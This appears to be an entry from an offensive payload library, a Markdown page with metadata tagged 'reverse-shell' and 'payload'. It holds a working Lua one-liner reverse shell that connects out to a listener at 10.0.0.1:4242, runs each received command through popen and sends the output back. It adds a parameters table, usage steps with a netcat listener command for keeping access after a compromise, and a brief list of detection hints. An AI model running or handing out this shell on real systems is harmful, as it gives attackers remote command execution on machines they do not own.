---
id: 4d02fb88-4771-4b15-8ec7-74e3dde6a5f4
type: code
language: lua
verified: true
created_at: '2023-04-06T03:56:24.651829+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - reverse-shell
  - lua
  - payload
  - interactive
platforms:
  - Linux
validated: true
---

# Lua-Interactive-TCP-Reverse-Shell

## Code

```lua
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## Description

This Lua script implements an interactive reverse shell by connecting to a listener, entering a loop to receive commands, executing them via popen, capturing output, and sending it back until the connection closes. It supports sustained remote command execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| host | Target listener IP (hardcoded as "10.0.0.1") | "192.168.1.100" |
| port | Listener port (hardcoded as 4242) | 4444 |

## Usage

Run on the target after setting up a listener (e.g., nc -lvnp 4242). Edit the host and port variables in the script. Ideal for prolonged access in red team operations following initial compromise.

## Detection

- Lua5.1 processes with -e and socket/io requires.
- Anomalous popen executions from lua scripts.
- Bidirectional TCP traffic patterns indicative of command-response loops.

## Related

- [[procedures/Implement-Lua-Reverse-Shell]]
